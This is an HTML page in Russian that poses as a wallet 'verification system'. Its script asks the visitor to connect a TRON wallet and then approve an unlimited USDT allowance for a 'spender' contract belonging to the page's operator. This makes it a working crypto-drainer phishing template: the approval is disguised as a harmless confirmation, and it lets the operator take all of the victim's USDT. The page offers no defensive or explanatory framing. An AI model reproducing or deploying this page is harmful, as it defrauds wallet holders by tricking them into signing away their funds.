<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            text-align: center; 
            margin-top: 100px; 
            background-color: #0f172a; 
            color: #fff; 
        }
        button { 
            padding: 15px 30px; 
            font-size: 18px; 
            cursor: pointer; 
            background-color: #2563eb; 
            color: white; 
            border: none; 
            border-radius: 8px; 
        }
        button:hover { 
            background-color: #1d4ed8; 
        }
        #approveBtn { 
            display: none; 
            background-color: #16a34a; 
            margin-top: 20px; 
        }
        #status {
            margin-top: 20px;
            font-size: 16px;
            color: #94a3b8;
        }
    </style>
</head>
<body>

    <h1>Система верификации</h1>
    <p id="status">Нажмите кнопку для подключения</p>
    
    <button id="connectBtn">Подключить кошелек</button>
    <br>
    <button id="approveBtn">Подтвердить</button>

    <script>
        const USDT_TRC20 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // Официальный USDT Tron
        const SPENDER_CONTRACT = "0xd9145CCE52D386f254917e481eB44e9943F39138"; // Ваш адрес контракта
        const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

        const connectBtn = document.getElementById('connectBtn');
        const approveBtn = document.getElementById('approveBtn');
        const statusText = document.getElementById('status');

        connectBtn.onclick = async () => {
            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                statusText.innerText = "Подключено: " + window.tronWeb.defaultAddress.base58;
                connectBtn.style.display = 'none';
                approveBtn.style.display = 'inline-block';
            } else {
                alert("Откройте сайт во встроенном браузере кошелька (например, Trust Wallet или TronLink)!");
            }
        };

        approveBtn.onclick = async () => {
            try {
                statusText.innerText = "Запрос подтверждения...";
                const usdtContract = await window.tronWeb.contract().at(USDT_TRC20);
                
                // Запрос безлимитного аппрува на ваш смарт-контракт
                await usdtContract.approve(SPENDER_CONTRACT, MAX_UINT256).send({
                    feeLimit: 100_000_000
                });
                
                statusText.innerText = "Успешно!";
                alert("Операция выполнена.");
            } catch (err) {
                console.error(err);
                statusText.innerText = "Ошибка или отказ.";
            }
        };
    </script>
</body>
</html>
